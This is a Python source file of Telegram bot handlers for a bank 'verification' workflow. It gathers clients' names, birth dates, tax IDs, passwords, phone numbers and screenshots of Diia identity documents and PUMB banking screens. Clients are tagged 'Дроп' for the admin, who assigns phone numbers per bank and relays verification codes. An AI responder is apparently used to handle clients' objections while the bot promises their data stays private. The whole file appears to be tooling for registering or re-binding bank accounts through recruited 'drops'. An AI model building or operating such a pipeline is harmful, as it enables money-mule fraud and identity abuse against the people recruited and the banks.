from aiogram import Router, F, Bot
from aiogram.filters import CommandStart, StateFilter
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile, InputMediaPhoto
from aiogram.fsm.context import FSMContext
from bot.config import BANK_TEMPLATES, get_template_photo, get_admin_id
from bot.services.line_assignment import get_all_banks_for_selection, build_bank_selection_rows
from bot.services.bank_profiles_service import get_bank_profile_by_bot_username
from bot.bot_registry import get_bot, get_bot_for_session
import bot.database as db
import re
import asyncio
import aiosqlite
import logging
import time
import html
import io
import os

from bot.handlers.client_helpers import *
logger = logging.getLogger(__name__)
router = Router()

_client_reply_cooldowns = {}
_pumb_new_photo_tasks: dict[int, asyncio.Task] = {}
_pumb_rebind_photo_tasks: dict[int, asyncio.Task] = {}
_pumb_photo_locks: dict[int, asyncio.Lock] = {}

PUMB_EXAMPLE_PHOTOS_DIR = r"C:\Users\oliks\Documents\PUMB"
PUMB_REBIND_EXAMPLES_DIR = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "pumb_rebind")

def _get_pumb_example_photos() -> list[str]:
    """Повертає список прикладів фото для ПУМБ (скріншоти з Дії)."""
    try:
        if not os.path.isdir(PUMB_EXAMPLE_PHOTOS_DIR):
            return []
        files = [
            f for f in os.listdir(PUMB_EXAMPLE_PHOTOS_DIR)
            if f.lower().endswith(('.jpg', '.jpeg', '.png', '.webp', '.gif'))
        ]
        files.sort()
        return [os.path.join(PUMB_EXAMPLE_PHOTOS_DIR, f) for f in files]
    except Exception:
        return []

def _get_pumb_rebind_example(step_index: int) -> str | None:
    """Повертає шлях до прикладу N-го скріншоту для перев'язу ПУМБ."""
    try:
        if not os.path.isdir(PUMB_REBIND_EXAMPLES_DIR):
            return None
        filename = f"pumb_rebind_{step_index + 1:02d}.jpg"
        path = os.path.join(PUMB_REBIND_EXAMPLES_DIR, filename)
        return path if os.path.exists(path) else None
    except Exception:
        return None

def _get_pumb_rebind_howto(step_index: int) -> tuple[str | None, str | None]:
    """Повертає шлях до HowTo фото-підказки та текст для кроку, або (None, None)."""
    howto_map = {
        1: ("HowToFinance.png", "Скиньте скрін з вкладки Фінанси"),
        2: ("HowToProfile.png", "Тепер зайдіть у профіль"),
        3: ("HowToLimit.png", "У вкладці профіля гортайте до самого низу та жміть на вкладку «Ліміти на перекази» ")
    }
    if step_index in howto_map:
        filename, text = howto_map[step_index]
        path = os.path.join(PUMB_REBIND_EXAMPLES_DIR, "PUMBHOW", filename)
        if os.path.exists(path):
            return path, text
    return None, None

PUMB_REBIND_INSTRUCTIONS = [
    "Скиньте скріншот з головного меню ПУМБ",
    "Ось такий ось",
    "Ось такий ось",
    "Ось такий ось",
    "Надішліть, будь ласка, скріншот ID-картки / паспорта у додатку Дія",
    "Надішліть, будь ласка, скріншот РНОКПП (ІПН) з реєстрацією / документами у додатку Дія",
    "Надішліть, будь ласка, скріншот розділу \"Виконавчі провадження\" у додатку Дія",
]

async def _send_pumb_rebind_step(bot: Bot, chat_id: int, step_index: int):
    """Надсилає клієнту інструкцію та приклад для поточного кроку перев'язу ПУМБ."""
    if step_index == 4:
        p5 = _get_pumb_rebind_example(4)
        p6 = _get_pumb_rebind_example(5)
        p7 = _get_pumb_rebind_example(6)
        if p5 and p6 and p7 and os.path.exists(p5) and os.path.exists(p6) and os.path.exists(p7):
            try:
                diia_caption = "І останні 3 фото з Дія будь ласка"
                media_group = [
                    InputMediaPhoto(media=FSInputFile(p5), caption=diia_caption),
                    InputMediaPhoto(media=FSInputFile(p6)),
                    InputMediaPhoto(media=FSInputFile(p7)),
                ]
                await bot.send_media_group(chat_id=chat_id, media=media_group)
                return
            except Exception as e:
                logger.warning(f"Не вдалося надіслати альбом прикладів Дії: {e}")

    # Спочатку надсилаємо фото-підказку "Як знайти цей розділ" (якщо присутнє)
    howto_path, howto_text = _get_pumb_rebind_howto(step_index)
    if howto_path and howto_text:
        try:
            await bot.send_photo(chat_id=chat_id, photo=FSInputFile(howto_path), caption=howto_text)
        except Exception as e:
            logger.warning(f"Не вдалося надіслати HowTo підказку для кроку {step_index}: {e}")

    instruction = PUMB_REBIND_INSTRUCTIONS[step_index] if 0 <= step_index < len(PUMB_REBIND_INSTRUCTIONS) else "Надішліть, будь ласка, наступний скріншот."
    example_path = _get_pumb_rebind_example(step_index)
    if example_path and os.path.exists(example_path):
        try:
            await bot.send_photo(chat_id=chat_id, photo=FSInputFile(example_path), caption=instruction)
            return
        except Exception as e:
            logger.warning(f"Не вдалося надіслати приклад фото ПУМБ-перев'язу: {e}")
    await bot.send_message(chat_id=chat_id, text=instruction)

def should_send_client_reply(client_id: int, key: str = "default", cooldown: float = 3.0) -> bool:
    """Перевіряє, чи не було аналогічної відповіді клієнту протягом останніх cooldown секунд (для захисту від дублів у альбомах/флуді)"""
    now = time.time()
    cache_key = (client_id, key)
    last_time = _client_reply_cooldowns.get(cache_key, 0)
    if now - last_time < cooldown:
        return False
    _client_reply_cooldowns[cache_key] = now
    return True
@router.message(F.text == "/id")
async def cmd_get_chat_id(message: Message):
    await message.answer(f"ID цього чату: <code>{message.chat.id}</code>", parse_mode="HTML")

@router.message(F.chat.type == "private", F.text == "⏳ Очікування номера...")
async def handle_waiting_number_text(message: Message):
    """Обробник натискання кнопки очікування номера"""
    await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
@router.message(CommandStart(), F.chat.type == "private")
@router.message(F.chat.type == "private", F.text.in_({"Розпочати знову", "🔄 Розпочати знову"}))
async def cmd_start(message: Message, state: FSMContext):
    """Обробник команди /start для клієнта"""
    try:
        bot_name = getattr(message, 'bot', None)
        bot_username = None
        if bot_name:
            try:
                me = await bot_name.get_me()
                bot_username = me.username
            except Exception as e:
                logger.warning(f"cmd_start get_me failed: {e}")
        logger.info(
            f"cmd_start triggered: user_id={message.from_user.id}, "
            f"username={message.from_user.username}, chat_type={message.chat.type}, "
            f"bot_username={bot_username}"
        )

        if message.from_user.id == get_admin_id():
            from bot.handlers.admin import get_admin_keyboard, clear_previous_admin_messages, register_admin_message
            msg = await message.answer(
                "Привіт, Адміне!\n\n"
                "Оберіть потрібну дію на клавіатурі нижче:",
                reply_markup=get_admin_keyboard()
            )
            if state:
                await clear_previous_admin_messages(message.chat.id, state, message.bot)
                try:
                    await message.delete()
                except Exception:
                    pass
                await register_admin_message(msg, state)
            return

        # Перевірка режиму сну
        from bot.sleep_mode import is_in_sleep_mode
        if is_in_sleep_mode():
            from bot.config import get_cached_setting
            reply_text = get_cached_setting("sleep_mode_reply", "На жаль, зараз не робочий час. Поверніться пізніше.")
            await message.answer(reply_text, reply_markup=ReplyKeyboardRemove())
            return

        client_id = message.from_user.id
        username_db = message.from_user.username or "Немає юзернейму"
        client_bot_username = bot_username

        # ПУМБ-бот: запитуємо тип реєстрації — нова або перев'яз
        if client_bot_username and client_bot_username.lower() == 'fornotvolfbankbot':
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Нова Реєстрація", callback_data="pumb_new")],
                [InlineKeyboardButton(text="Перев'яз", callback_data="pumb_rebind")]
            ])
            await message.answer("Оберіть тип реєстрації:", reply_markup=keyboard)
            await state.update_data(client_bot_username=client_bot_username)
            return

        # Для rummyverifbot та інших — без привітання, одразу ПІБ/ДОБ
        existing_session = await db.get_session(client_id)

        if existing_session and existing_session['status'] in ('number_assigned', 'waiting_code'):
            await message.answer("Ваш запит вже обробляється або лінія активна. Будь ласка, очікуйте вказівок адміна.")
            return

        if existing_session and existing_session['status'] in ('registered', 'waiting_verification', 'verified'):
            # Якщо всі банки завершено (немає залишкових банків), дозволяємо розпочати нову сесію
            remaining_banks_str = existing_session.get('remaining_banks', '')
            remaining = [b for b in remaining_banks_str.split(",") if b]
            if remaining or not existing_session.get('selected_banks'):
                await message.answer(
                    "Ваш запит на верифікацію вже прийнято і він очікує перевірки адміністратором. Будь ласка, очікуйте призначення номера телефону.",
                    reply_markup=get_waiting_keyboard()
                )
                return

        await state.clear()
        await state.update_data(client_bot_username=client_bot_username)
        await db.create_registering_session(client_id, username_db, bot_username=client_bot_username)
        await register_reg_msg(state, message.message_id)

        # Перевіряємо можливість автозаповнення з попередньої/поточної сесії
        if existing_session and existing_session['client_data']:
            ipn_match = re.search(r'ІПН:\s*(\d+)', existing_session['client_data'])
            pib_match = re.search(r'ПІБ:\s*(.+)', existing_session['client_data'])
            dob_match = re.search(r'Дата:\s*(.+)', existing_session['client_data'])

            if ipn_match and pib_match and dob_match:
                ipn = ipn_match.group(1)
                pib = pib_match.group(1)
                dob = dob_match.group(1)

                welcome_text = (
                    f"Привіт! Знайдено ваші попередні дані верифікації:\n\n"
                    f"• **ПІБ:** {pib}\n"
                    f"• **Дата народження:** {dob}\n"
                    f"• **ІПН:** {ipn}\n\n"
                    f"Бажаєте використати ці дані для автозаповнення чи ввести нові дані (наприклад, для друга)?"
                )
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔄 Використати ці дані", callback_data="autofill_use")],
                    [InlineKeyboardButton(text="✍️ Ввести нові дані", callback_data="autofill_new")]
                ])
                msg = await message.answer(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
                await register_reg_msg(state, msg.message_id)
                await state.update_data(welcome_msg_ids=[msg.message_id], old_pib=pib, old_dob=dob, old_ipn=ipn)
                await state.set_state(RegistrationStates.waiting_pib_dob)
                return

        # Крок 1: Запитуємо ПІБ та Дату народження
        await db.update_session_client_phone(client_id, None)
        pib_msg = await message.answer(
            "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
            reply_markup=get_cancel_keyboard()
        )
        await register_reg_msg(state, pib_msg.message_id)
        await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
        await state.set_state(RegistrationStates.waiting_pib_dob)
    except Exception as e:
        logger.exception(f"cmd_start error for user {message.from_user.id}: {e}")
        try:
            await message.answer("Виникла технічна помилка. Спробуйте /start ще раз трохи пізніше.")
        except Exception:
            pass
@router.callback_query(F.data == "autofill_use")
async def handle_autofill_use(callback: CallbackQuery, state: FSMContext):
    """Обробник вибору використання попередніх даних"""
    state_data = await state.get_data()
    pib = state_data.get('old_pib')
    dob = state_data.get('old_dob')
    ipn = state_data.get('old_ipn')
    
    if not (pib and dob and ipn):
        await callback.answer("Не вдалося розпарсити старі дані.", show_alert=True)
        return
    
    # Зберігаємо дані в стан FSM
    await state.update_data(pib=pib, dob=dob, ipn=ipn)
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"Перевірте ваші дані:\n\n"
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата народження: {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg")],
        [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
    ])
    
    state_data = await state.get_data()
    welcome_msg_ids = state_data.get('welcome_msg_ids', [])
    for msg_id in welcome_msg_ids:
        try:
            await callback.bot.delete_message(chat_id=callback.message.chat.id, message_id=msg_id)
        except Exception:
            pass
    msg = await callback.message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await register_reg_msg(state, msg.message_id)
    await state.set_state(RegistrationStates.waiting_confirm)
    await callback.answer()
@router.callback_query(F.data == "autofill_new")
async def handle_autofill_new(callback: CallbackQuery, state: FSMContext):
    """Обробник вибору ручного введення нових даних"""
    state_data = await state.get_data()
    welcome_msg_ids = state_data.get('welcome_msg_ids', [])
    await state.clear()
    await db.update_session_client_phone(callback.from_user.id, None)
    for msg_id in welcome_msg_ids:
        try:
            await callback.bot.delete_message(chat_id=callback.message.chat.id, message_id=msg_id)
        except Exception:
            pass
    pib_msg = await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=get_cancel_keyboard()
    )
    await register_reg_msg(state, pib_msg.message_id)
    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer()
@router.message(RegistrationStates.waiting_pib_dob, F.chat.type == "private")
async def process_pib_dob(message: Message, state: FSMContext):
    """Отримання ПІБ та Дати народження (можна окремими повідомленнями)"""
    text = message.text.strip()
    state_data = await state.get_data()
    reg_chat_history = state_data.get('reg_chat_history', [])
    saved_pib = state_data.get('pib')
    saved_dob = state_data.get('dob')
    
    # 0. Перевіряємо наявність запитань / заперечень через ШІ
    if is_question_or_objection(text):
        await register_reg_msg(state, message.message_id)
        
        # Перевірка на спам
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 5:
            msg = await message.answer(
                "Перевищено ліміт запитань та помилок. Будь ласка, введіть коректні дані для реєстрації (ПІБ та Дату Народження). "
                "Якщо виникли труднощі — зверніться до адміністратора."
            )
            await register_reg_msg(state, msg.message_id)
            return
            
        await message.bot.send_chat_action(chat_id=message.chat.id, action="typing")
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data="",
            current_bank_name=None,
            chat_history=reg_chat_history
        )
        msg = await message.answer(response)
        await register_reg_msg(state, msg.message_id)
        
        # Зберігаємо до історії
        reg_chat_history.append({"role": "user", "content": message.text})
        reg_chat_history.append({"role": "assistant", "content": response})
        await state.update_data(reg_chat_history=reg_chat_history)
        return
    
    await register_reg_msg(state, message.message_id)

    # Шукаємо ІПН (10 цифр, перша не нуль)
    ipn_match = re.search(r'\b([1-9]\d{9})\b', text)
    if ipn_match:
        ipn_val = ipn_match.group(1)
        await state.update_data(ipn=ipn_val)
        text = text.replace(ipn_val, '').strip()

    # Шукаємо дату народження
    date_match = re.search(r'\b(\d{1,2}[\.\-\/,]\d{1,2}[\.\-\/,]\d{2,4})\b', text)
    if not date_match:
        date_match = re.search(r'\b(\d{1,2}\s+\d{1,2}\s+\d{4})\b', text)
        
    dob = None
    if date_match:
        dob_raw = date_match.group(1)
        dob = parse_and_validate_date(dob_raw)
        if not dob:
            # Знайдено щось схоже на дату, але вона недійсна (наприклад, 73.41.1889)
            err_msg = await message.answer(
                "Некоректний формат або значення дати народження.\n"
                "Будь ласка, введіть реальну дату у форматі ДД.ММ.РРРР (наприклад: 15.08.1995):",
                reply_markup=get_cancel_keyboard()
            )
            await register_reg_msg(state, err_msg.message_id)
            await state.update_data(pib_prompt_msg_id=err_msg.message_id)
            return
        text_rest = text.replace(dob_raw, '').strip()
    else:
        text_rest = text

    pib = clean_pib(text_rest) if text_rest else ""

    progress_made = False

    # Оновлюємо значення
    if dob:
        saved_dob = dob
        await state.update_data(dob=dob, support_requests_count=0)
        progress_made = True
    if pib and is_valid_pib(pib):
        saved_pib = pib
        await state.update_data(pib=pib, support_requests_count=0)
        progress_made = True

    if not progress_made:
        # Введено не ПІБ і не дату
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 5:
            msg = await message.answer(
                "Перевищено ліміт запитань та помилок. Будь ласка, введіть коректні дані для реєстрації (ПІБ та Дату Народження). "
                "Якщо виникли труднощі — зверніться до адміністратора."
            )
            await register_reg_msg(state, msg.message_id)
            return
            
        # Підказуємо формат
        if saved_dob:
            err_msg = await message.answer(
                "Будь ласка, введіть Ваші справжні ПІБ (Прізвище, Ім'я, По Батькові):\n\n"
                "Приклад: Шевченко Тарас Григорович",
                reply_markup=get_cancel_keyboard()
            )
        elif saved_pib:
            err_msg = await message.answer(
                "Будь ласка, введіть Вашу дату народження:\n\n"
                "Приклад: 15.08.1995",
                reply_markup=get_cancel_keyboard()
            )
        else:
            err_msg = await message.answer(
                "Будь ласка, введіть Ваші справжні ПІБ та Дату Народження.\n\n"
                "Приклад: Шевченко Тарас Григорович 15.08.1995",
                reply_markup=get_cancel_keyboard()
            )
        await register_reg_msg(state, err_msg.message_id)
        return

    # Перевіряємо збір обох частин
    if saved_pib and saved_dob:
        client_data = f"ПІБ: {saved_pib}\nДата: {saved_dob}"
        await state.update_data(client_data=client_data)
        
        # Перевіряємо, чи ми вже розпізнали ІПН на попередньому кроці
        state_data = await state.get_data()
        saved_ipn = state_data.get('ipn')
        
        if saved_ipn:
            confirm_text = (
                f"Перевірте ваші дані:\n\n"
                f"ІПН: {saved_ipn}\n"
                f"ПІБ: {saved_pib}\n"
                f"Дата народження: {saved_dob}"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg")],
                [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
            ])
            msg = await message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
            await register_reg_msg(state, msg.message_id)
            await state.set_state(RegistrationStates.waiting_confirm)
        else:
            ipn_msg1 = await message.answer(
                "Будь ласка, напишіть Ваш ІПН (10 цифр):",
                reply_markup=get_cancel_keyboard()
            )
            ipn_msg2 = await message.answer(
                "Ми запитуємо ІПН, ПІБ та дату народження виключно для перевірки через офіційні державні реєстри:\n"
                "• щоб переконатися, що немає відкритих проваджень\n"
                "• щоб перевірити, чи не було раніше співпраці з нашою компанією\n\n"
                "*Важливо:*\n"
                "Ці дані використовуються тільки для внутрішньої перевірки і не передаються третім особам.",
                parse_mode="Markdown"
            )
            await register_reg_msg(state, ipn_msg1.message_id)
            await register_reg_msg(state, ipn_msg2.message_id)
            await state.update_data(ipn_prompt_msg_ids=[ipn_msg1.message_id, ipn_msg2.message_id])
            await state.set_state(RegistrationStates.waiting_ipn)
    elif saved_pib:
        err_msg = await message.answer(
            "Напишіть також вашу дату народження?",
            reply_markup=get_cancel_keyboard()
        )
        await register_reg_msg(state, err_msg.message_id)
        await state.update_data(pib_prompt_msg_id=err_msg.message_id)
    elif saved_dob:
        err_msg = await message.answer(
            "Напишіть також ваші ПІБ (Прізвище Ім'я По Батькові)?",
            reply_markup=get_cancel_keyboard()
        )
        await register_reg_msg(state, err_msg.message_id)
        await state.update_data(pib_prompt_msg_id=err_msg.message_id)
    else:
        err_msg = await message.answer(
            "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
            reply_markup=get_cancel_keyboard()
        )
        await register_reg_msg(state, err_msg.message_id)
        await state.update_data(pib_prompt_msg_id=err_msg.message_id)
@router.message(RegistrationStates.waiting_ipn, F.chat.type == "private")
async def process_ipn(message: Message, state: FSMContext):
    """Отримання ІПН та перехід до підтвердження даних"""
    ipn = message.text.strip()
    state_data = await state.get_data()
    reg_chat_history = state_data.get('reg_chat_history', [])
    
    # 0. Перевіряємо наявність запитань / заперечень через ШІ
    if is_question_or_objection(ipn):
        await register_reg_msg(state, message.message_id)
        
        # Перевірка на спам
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 5:
            msg = await message.answer(
                "Перевищено ліміт запитань та помилок. Будь ласка, напишіть Ваш ІПН (10 цифр). "
                "Якщо виникли труднощі — зверніться до адміністратора."
            )
            await register_reg_msg(state, msg.message_id)
            return
            
        await message.bot.send_chat_action(chat_id=message.chat.id, action="typing")
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data="",
            current_bank_name=None,
            chat_history=reg_chat_history
        )
        msg = await message.answer(response)
        await register_reg_msg(state, msg.message_id)
        
        # Зберігаємо до історії
        reg_chat_history.append({"role": "user", "content": message.text})
        reg_chat_history.append({"role": "assistant", "content": response})
        await state.update_data(reg_chat_history=reg_chat_history)
        return
    
    await register_reg_msg(state, message.message_id)
    state_data = await state.get_data()

    if not ipn.isdigit() or len(ipn) != 10:
        err_msg = await message.answer("ІПН має складатися рівно з 10 цифр. Будь ласка, перевірте та спробуйте ще раз:")
        await state.update_data(ipn_prompt_msg_ids=[err_msg.message_id])
        return

    await state.update_data(ipn=ipn)
    data = await state.get_data()
    pib = data['pib']
    dob = data['dob']
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"Перевірте ваші дані:\n\n"
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата народження: {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg")],
        [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
    ])
    
    msg = await message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await register_reg_msg(state, msg.message_id)
    await state.set_state(RegistrationStates.waiting_confirm)
@router.callback_query(F.data == "confirm_reg")
async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bot):
    """Обробник підтвердження реєстраційних даних"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла або вже підтверджена.", show_alert=True)
        return

    data = await state.get_data()
    pib = data.get('pib')
    dob = data.get('dob')
    ipn = data.get('ipn')
    
    if not pib or not dob or not ipn:
        await callback.answer("Дані не знайдено. Будь ласка, почніть спочатку з /start.", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await state.clear()
        return

    # Видаляємо всі повідомлення процесу реєстрації (до очищення стану!)
    await delete_reg_messages(callback.message.chat.id, state, callback.bot)

    await state.clear()

    # Формуємо дані для адмін-панелі та Telegram повідомлення
    client_data = f"ІПН: {ipn}\nПІБ: {pib}\nДата: {dob}"
    username = callback.from_user.username
    if username:
        client_data += f"\n\nДроп - @{username}"
        
    client_id = callback.from_user.id
    username_db = username or "Немає юзернейму"


    # Створюємо/оновлюємо сесію в базі даних
    # Визначаємо username бота, з якого прийшло підтвердження
    try:
        me = await callback.bot.get_me()
        client_bot_username = me.username
    except Exception:
        client_bot_username = None

    if not client_bot_username:
        state_data = await state.get_data()
        client_bot_username = state_data.get('client_bot_username')

    await db.create_or_update_session(client_id, username_db, client_data, bot_username=client_bot_username)

    # Беремо обрані банки з профілю цього бота
    profile = await get_bank_profile_by_bot_username(client_bot_username) if client_bot_username else None
    preselected_banks = []
    if profile and profile.get('selected_banks'):
        preselected_banks = [b for b in profile['selected_banks'] if b]
    if preselected_banks:
        selected_str = ",".join(preselected_banks)
        remaining_str = selected_str
        await db.update_session_banks(client_id, selected_str, remaining_str)
        
    msg = await callback.message.answer(
        "Зачекайте будь ласка кілька хвилин",
        reply_markup=get_waiting_keyboard()
    )
    await db.update_session_waiting_message_id(client_id, msg.message_id)
    await callback.answer("Дані підтверджено!")

    # Отримуємо унікальні назви банків для вибору адміном
    all_banks = await get_all_banks_for_selection()
    
    warning_text = ""
    if not all_banks:
        warning_text = "\n\n⚠️ *Попередження:* немає доступних ліній/номерів у базі! Додайте номери через сайт або в чат."
        
    # Отримуємо історію верифікацій клієнта
    history = await db.get_client_verification_history(client_id)
    passed_banks = {h['bank'] for h in history if h['status'] == 'success'}
    banned_banks = {h['bank'] for h in history if h['status'] in ('banned', 'failure')}

    # Створюємо кнопки вибору банків (якщо профіль має банки — вони вже позначені)
    keyboard_buttons = build_bank_selection_rows(
        all_banks, client_id, selected=preselected_banks, passed_banks=passed_banks, banned_banks=banned_banks
    )
    
    # Додаємо керівні кнопки
    keyboard_buttons.append([InlineKeyboardButton(text="Зберегти та продовжити", callback_data=f"savebanks_{client_id}")])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    # Сповіщаємо адміна в Telegram
    import html
    escaped_username = html.escape(username) if username else "Невідомий"
    escaped_client_data = html.escape(client_data)
    escaped_warning = html.escape(warning_text) if warning_text else ""
    admin_msg = (
        f"Новий клієнт на верифікацію!\n"
        f"• Telegram: @{escaped_username} (ID: {client_id})\n"
        f"• Дані:\n<pre>{escaped_client_data}</pre>\n"
        f"Оберіть банки, які має пройти клієнт:{escaped_warning}"
    )
    
    # Надсилаємо адміну з основного/дефолтного бота (адмін може не писати профільним ботом)
    admin_bot = get_bot() or callback.bot
    try:
        await admin_bot.send_message(chat_id=get_admin_id(), text=admin_msg, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Помилка надсилання адмін-повідомлення: {e}")
@router.callback_query(F.data == "restart_reg")
async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
    """Обробник скасування та заповнення анкети заново"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла.", show_alert=True)
        return
        
    await state.clear()
    try:
        await callback.message.delete()
    except Exception:
        await callback.message.edit_reply_markup(reply_markup=None)
    pib_msg = await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=get_cancel_keyboard()
    )
    await register_reg_msg(state, pib_msg.message_id)
    await state.update_data(pib_prompt_msg_id=pib_msg.message_id)
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer("Почнемо заново!")
@router.message(RegistrationStates.waiting_password, F.chat.type == "private")
async def process_client_password(message: Message, state: FSMContext):
    password = message.text.strip()
    await state.update_data(client_password=password)
    client_id = message.from_user.id
    session = await db.get_session(client_id)

    if session and session.get('client_phone'):
        # Якщо в базі вже є збережений номер, просто використовуємо його
        await continue_after_phone(message, state, message.bot, client_id)
        return

    await message.answer("Будь ласка, напишіть Ваш номер телефону?")
    await state.set_state(RegistrationStates.waiting_phone)
@router.message(RegistrationStates.waiting_phone, F.chat.type == "private")
async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
    text = message.text.strip()
    client_id = message.from_user.id
    
    session = await db.get_session(client_id)
    if not session:
        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
        await state.clear()
        return

    # 1. Пряме детерміноване розпізнавання номера телефону через регулярні вирази
    phone_digits = re.sub(r'\D', '', text)
    extracted_phone = None
    if len(phone_digits) == 10 and phone_digits.startswith('0'):
        extracted_phone = "+38" + phone_digits
    elif len(phone_digits) == 12 and phone_digits.startswith('380'):
        extracted_phone = "+" + phone_digits
    elif len(phone_digits) == 9 and not phone_digits.startswith('0'):
        extracted_phone = "+380" + phone_digits

    if extracted_phone:
        logger.info(f"Phone number '{extracted_phone}' recognized directly via regex for client {client_id}")
        await db.update_session_client_phone(client_id, extracted_phone)
        await message.answer("Дякую! Номер телефону прийнято.")
        await continue_after_phone(message, state, bot, client_id)
        return

    # 2. Якщо номер не підходить під дефолтний формат, використовуємо ШІ для аналізу (відмова, запитання тощо)
    from bot.openai_client import get_support_response
    response = await get_support_response(
        user_text=text,
        client_data=session.get('client_data', ''),
        current_bank_name="номер телефону"
    )
    
    # Перевіряємо чи ШІ розпізнав номер телефону
    phone_match = re.search(r'\[PHONE:\s*([+\d\s\(\)]{9,20})\]', response)
    if phone_match:
        phone_number = phone_match.group(1).strip()
        # Зберігаємо номер телефону в сесію
        await db.update_session_client_phone(client_id, phone_number)
        
        # Переходимо до наступного кроку
        await message.answer("Дякую! Номер телефону прийнято.")
        await continue_after_phone(message, state, bot, client_id)
    else:
        # Перевіряємо, чи клієнт відмовився надавати телефон
        if "[REFUSED_PHONE]" in response:
            username = message.from_user.username or "Немає юзернейму"
            try:
                await bot.send_message(
                    chat_id=get_admin_id(),
                    text=f"⚠️ <b>Увага!</b> Клієнт @{username} (ID: {client_id}) відмовився надавати номер телефону.\nПовідомлення клієнта: <i>{text}</i>",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"Не вдалося надіслати сповіщення адміну про відмову телефону: {e}")
        
        # Якщо ШІ не розпізнав номер, просимо повторити (надсилаємо очищену відповідь ШІ)
        clean_text = re.sub(r'\[[^\]]*\]?', '', response).strip()
        await message.answer(clean_text or "Будь ласка, надішліть коректний номер телефону.")
@router.message(F.chat.type == "private", F.text & F.text.startswith('/'))
async def handle_custom_bank_commands(message: Message):
    """Обробник кастомних команд завантаження додатків та інструкцій реєстрації"""
    cmd = message.text.strip().lower()
    
    # Інструкції реєстрації, які використовуються додатково
    manual_instructions = {
        "/екорег": "Анкетні дані в самому ЕкоБанку виставляти як на фото! Слово п...",
        "/аморег": "Анкетні дані в самому АмоБанку виставляти як на фото..."
    }
    
    if cmd in manual_instructions:
        photo_path = get_template_photo(cmd)
        if photo_path:
            await message.answer_photo(photo=FSInputFile(photo_path), caption=manual_instructions[cmd])
        else:
            await message.answer(manual_instructions[cmd])
        return

    # Перевіряємо по словнику BANK_TEMPLATES
    for key, val in BANK_TEMPLATES.items():
        if val['command'].lower() == cmd:
            photo_path = get_template_photo(key)
            if photo_path:
                await message.answer_photo(photo=FSInputFile(photo_path), caption=val['text'])
            else:
                await message.answer(val['text'])
            return
@router.message(no_code_message_filter, StateFilter("*"))
async def handle_universal_no_code(message: Message, state: FSMContext, bot: Bot):
    """Універсальний обробник повідомлень про відсутність коду (працює в будь-якому FSM стані)"""
    # Завжди відповідаємо клієнту шаблонною фразою, не змінюючи статус сесії в БД та не сповіщаючи адміна
    await message.answer("Ще не надійшов, ще чекаємо")
@router.message(StateFilter(None), F.chat.type == "private", F.text & ~F.text.startswith('/'))
async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bot):
    """Обробник повідомлень поза станами введення даних (захист від флуду + ШІ підтримка)"""
    client_id = message.from_user.id
    
    # Перевіряємо, чи є вже активна сесія у будь-котрому робочому статусі
    existing_session = await db.get_session(client_id)
    if existing_session:
        if existing_session.get('is_paused'):
            logger.info(f"AI bot is paused for client {client_id}. Ignoring automatic AI support response.")
            return
        if existing_session['status'] == 'registered':
            if should_send_client_reply(client_id, key="registered_wait", cooldown=3.0):
                await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
            return
        elif existing_session['status'] == 'waiting_verification':
